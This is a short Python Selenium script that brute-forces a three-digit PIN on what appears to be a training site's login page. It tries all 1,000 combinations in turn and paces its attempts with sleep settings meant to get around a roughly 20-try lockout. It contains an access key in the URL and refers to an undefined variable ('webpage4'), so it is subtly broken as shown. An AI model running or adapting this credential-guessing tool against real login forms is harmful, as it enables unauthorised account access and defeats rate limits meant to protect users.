#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sat Nov  2 23:39:00 2019

@author: scarlett
"""

import string
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
attempts = 0
attemptsallowed = 20
timetosleep = 0 #15,35,65,125,
webpage10 = "http://10.cybertrial.co.uk/login?mykey=a39KvztnMHrEqdXrhyuZddZPmTrLqEcqWRRwrhk4"
DigPoss = string.digits
driver = webdriver.Firefox()
driver.get(webpage4)

#eltest = driver.find_element_by_class_name('btn') #driver.find_elements_by_xpath("//*[contains(text(), 'Guess the pin')]")
#eltest.click(1)
#time.sleep(200)
try:
    elementbtn = driver.find_element_by_class_name("btn")
except:
    time.sleep(timetosleep)
    elementbtn = driver.find_element_by_class_name("btn")
elementbtn.click()
def check (i, j, k):
    conc = str(i) + str(j) + str(k)
    print("Using:", conc)
    elementpin = driver.find_element_by_name("pin") #.find_element_by_id("email")
    elementpin.send_keys(conc)
    elementpin.send_keys(Keys.RETURN)
    time.sleep(0.25)
    elementpin = driver.find_element_by_name("pin")
    elementpin.send_keys(Keys.CONTROL + 'a')
    elementpin.send_keys(Keys.DELETE)

for i in DigPoss:
    for j in DigPoss:
        for k in DigPoss:
            if (attempts < attemptsallowed):
                attempts +=1
                print(attempts)
                check(i,j,k)
            else:
                attempts = 0
                print(attempts)
                time.sleep(timetosleep)
                check(i,j,k)
                
            #elementpin.clear()
        #if (attempts < attemptsallowed):
        #attempts +=1
        #time.sleep(2)
        #else:
        #attempts = 0
        #time.sleep(timetosleep)